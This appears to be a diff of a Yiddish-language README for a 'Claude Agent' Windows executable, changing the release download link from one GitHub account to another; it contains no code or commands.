@@ -4,7 +4,7 @@
 
 ## 📥 דאונלאוד
 
-**[דאונלאוד די לעצטע ווערסיע »](https://github.com/kolsatmarfiles-ctrl/claude-agent/releases/latest)** — דאונלאוד `Claude Agent.exe` און לויף עס. איין איינציגע פייל, קיין אינסטאלאציע נישט נייטיג.
+**[דאונלאוד די לעצטע ווערסיע »](https://github.com/Frish-Gebakn/claude-agent/releases/latest)** — דאונלאוד `Claude Agent.exe` און לויף עס. איין איינציגע פייל, קיין אינסטאלאציע נישט נייטיג.
 
 ---
 
